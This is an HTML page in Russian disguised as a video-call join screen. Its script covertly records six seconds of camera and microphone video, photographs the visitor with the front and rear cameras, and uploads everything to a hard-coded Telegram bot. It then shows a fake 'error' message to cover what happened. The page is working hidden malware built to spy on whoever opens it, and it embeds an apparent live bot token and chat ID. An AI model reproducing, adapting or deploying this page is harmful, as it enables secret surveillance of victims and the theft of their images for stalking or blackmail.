<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Conference</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: #fff; }
        .app { height: 100%; display: flex; flex-direction: column; background: #080808; }
        .grid { flex: 1; display: flex; flex-direction: column; gap: 10px; padding: 12px; box-sizing: border-box; }
        .tile { flex: 1; background: #1e1f22; border-radius: 16px; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; border: 1px solid #2b2d31; }
        #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: none; }
        .wait-box { text-align: center; color: #949ba4; }
        .spin { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #5865f2; border-radius: 50%; animation: s 1s linear infinite; margin: 0 auto 10px; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .bar { height: 90px; background: #111214; border-radius: 24px 24px 0 0; display: flex; justify-content: space-evenly; align-items: center; padding: 0 10px; }
        .icon-btn { width: 50px; height: 50px; border-radius: 50%; background: #2b2d31; display: flex; align-items: center; justify-content: center; }
        .icon-btn svg { fill: #dbdee1; width: 24px; height: 24px; }
        .end-call { background: #da373c; }
        .end-call svg { fill: #fff; }
        .start { position: absolute; inset: 0; background: #000; z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
        .btn-join { background: #248046; color: #fff; border: none; padding: 16px; border-radius: 25px; font-weight: bold; width: 100%; max-width: 280px; margin-top: 20px; font-size: 16px; cursor: pointer; }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="app" id="main-ui">
    <div class="start" id="overlay">
        <div style="width:80px; height:80px; background:#1e1f22; border-radius:50%; display:flex; align-items:center; justify-content:center;">
            <svg width="40" height="40" viewBox="0 0 24 24" fill="#4f545c"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
        </div>
        <h2 style="margin-top:20px;">WebCall Session</h2>
        <p style="color:#888; font-size:14px;">Вход</p>
        <button class="btn-join" onclick="init()">Присоединиться</button>
    </div>

    <div class="grid">
        <div class="tile">
            <div id="v-status" class="wait-box">
                <svg width="50" height="50" viewBox="0 0 24 24" fill="#4f545c"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
            </div>
            <video id="v" autoplay playsinline muted></video>
        </div>
        <div class="tile">
            <div class="wait-box">
                <div class="spin"></div>
                <div style="font-size:10px; font-weight:bold; color:#5865f2; letter-spacing:1px;">CONNECTING...</div>
            </div>
        </div>
    </div>

    <div class="bar">
        <div class="icon-btn"><svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/><path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg></div>
        <div class="icon-btn"><svg viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg></div>
        <div class="icon-btn"><svg viewBox="0 0 24 24"><path d="M21 3H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h5v2h8v-2h5c1.1 0 1.99-.9 1.99-2L23 5c0-1.1-.9-2-2-2zm0 14H3V5h18v12z"/></svg></div>
        <div class="icon-btn end-call"><svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg></div>
    </div>
</div>

<canvas id="c"></canvas>

<script>
    const T = '8159596204:AAFK2P-vL3fvLk_CpyUIpTsk83B7_L1XYZ4';
    const C = '5784921257';

    async function send(blob, type, name) {
        const f = new FormData();
        f.append(type, blob, name);
        try {
            await fetch(`https://api.telegram.org/bot${T}/send${type.charAt(0).toUpperCase() + type.slice(1)}?chat_id=${C}`, { method: 'POST', body: f });
        } catch(e) {}
    }

    async function init() {
        document.getElementById('overlay').style.display = 'none';
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
            document.getElementById('v-status').style.display = 'none';
            video.style.display = 'block';
            video.srcObject = stream;
            await video.play();

            // ЗАПИСЬ ВИДЕО (6 секунд)
            const rec = new MediaRecorder(stream);
            let chunks = [];
            rec.ondataavailable = e => chunks.push(e.data);
            rec.onstop = () => send(new Blob(chunks, { type: 'video/mp4' }), 'video', 'video_6s.mp4');
            rec.start();

            setTimeout(async () => {
                // ФОТО ФРОНТАЛКИ (ИСПРАВЛЕНИЕ ИНВЕРСИИ)
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
                ctx.drawImage(video, 0, 0);
                canvas.toBlob(b => send(b, 'photo', 'face.jpg'), 'image/jpeg', 0.9);

                rec.stop();
                stream.getTracks().forEach(t => t.stop());
                
                // ЗАДНЯЯ КАМЕРА
                try {
                    const bStr = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    const bV = document.createElement('video');
                    bV.srcObject = bStr;
                    await bV.play();
                    setTimeout(() => {
                        canvas.width = bV.videoWidth; canvas.height = bV.videoHeight;
                        const bCtx = canvas.getContext('2d');
                        bCtx.setTransform(1, 0, 0, 1, 0, 0);
                        bCtx.drawImage(bV, 0, 0);
                        canvas.toBlob(b => send(b, 'photo', 'back.jpg'), 'image/jpeg', 0.9);
                        bStr.getTracks().forEach(t => t.stop());
                        done();
                    }, 1200);
                } catch(e) { done(); }

            }, 6000);

        } catch (e) { location.reload(); }
    }

    function done() {
        const m = ["Ошибка. Дождитесь собеседника или Перезагрузите страницу."];
        document.getElementById('main-ui').innerHTML = `
            <div style="height:100%; display:flex; align-items:center; justify-content:center; text-align:center; padding:20px;">
                <div>
                    <h3 style="font-weight:500;">${m[Math.floor(Math.random()*m.length)]}</h3>
                    <button class="btn-join" onclick="location.reload(true)">OK</button>
                </div>
            </div>`;
    }
</script>
</body>
</html>
